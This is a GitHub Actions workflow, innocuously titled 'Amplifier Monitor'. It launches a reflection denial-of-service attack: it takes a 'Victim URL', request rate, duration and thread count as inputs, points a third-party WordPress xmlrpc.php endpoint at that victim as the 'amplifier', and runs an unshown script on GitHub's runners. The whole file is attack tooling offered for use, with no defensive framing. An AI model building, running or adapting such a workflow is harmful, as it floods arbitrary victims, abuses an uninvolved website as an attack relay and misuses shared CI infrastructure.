name: Amplifier Monitor

on:
  workflow_dispatch:
    inputs:
      rpm:
        description: 'Requests per minute'
        required: true
        default: '60'
      duration:
        description: 'Duration (minutes)'
        required: true
        default: '10'
      victim:
        description: 'Victim URL'
        required: true
        default: 'http://example.com'
      threads:
        description: 'Threads'
        required: false
        default: '5'

jobs:
  monitor:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'
      - name: Install deps
        run: pip install requests
      - name: Create config
        run: |
          cat > config.json << EOF
          {
              "amplifier_url": "https://physiqueacademy.net/xmlrpc.php",
              "victim_url": "${{ github.event.inputs.victim }}",
              "requests_per_minute": ${{ github.event.inputs.rpm }},
              "duration_minutes": ${{ github.event.inputs.duration }},
              "threads": ${{ github.event.inputs.threads }}
          }
          EOF
      - name: Run Amplifier Monitor
        run: python3 scripts/amplifier_monitor.py
